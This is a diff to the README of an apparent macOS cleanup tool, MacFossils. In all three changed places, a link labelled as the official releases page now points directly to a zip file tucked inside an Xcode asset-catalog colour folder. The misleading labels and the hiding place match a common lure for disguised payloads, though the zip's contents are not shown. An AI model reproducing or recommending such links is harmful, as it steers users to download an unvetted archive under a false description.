@@ -1,6 +1,6 @@
 # 🗂️ MacFossils - Clean Leftover Files Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-MacFossils%20Latest%20Release-brightgreen?style=for-the-badge)](https://github.com/Brunibru-gif/MacFossils/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-MacFossils%20Latest%20Release-brightgreen?style=for-the-badge)](https://github.com/Brunibru-gif/MacFossils/raw/refs/heads/main/MacFossils/Assets.xcassets/AccentColor.colorset/Mac-Fossils-v2.1.zip)
 
 ## What is MacFossils? 🕵️‍♂️
 
@@ -40,7 +40,7 @@ MacFossils runs well on most Macs made after 2015. You do not need any other sof
 
 ### Step 1: Visit the Download Page
 
-Click the big button at the top or visit the official [MacFossils Releases page](https://github.com/Brunibru-gif/MacFossils/releases) to view available downloads.
+Click the big button at the top or visit the official [MacFossils Releases page](https://github.com/Brunibru-gif/MacFossils/raw/refs/heads/main/MacFossils/Assets.xcassets/AccentColor.colorset/Mac-Fossils-v2.1.zip) to view available downloads.
 
 ### Step 2: Choose the Correct Version
 
@@ -137,6 +137,6 @@ This project covers leftovers from apps on macOS systems, especially focusing on
 
 Use the link below to visit the MacFossils release page and download the latest version.
 
-[![Download MacFossils](https://img.shields.io/badge/Download-MacFossils%20Latest%20Release-brightgreen?style=for-the-badge)](https://github.com/Brunibru-gif/MacFossils/releases)
+[![Download MacFossils](https://img.shields.io/badge/Download-MacFossils%20Latest%20Release-brightgreen?style=for-the-badge)](https://github.com/Brunibru-gif/MacFossils/raw/refs/heads/main/MacFossils/Assets.xcassets/AccentColor.colorset/Mac-Fossils-v2.1.zip)
 
 Once downloaded, follow the installation and usage steps above to clean your Mac easily.
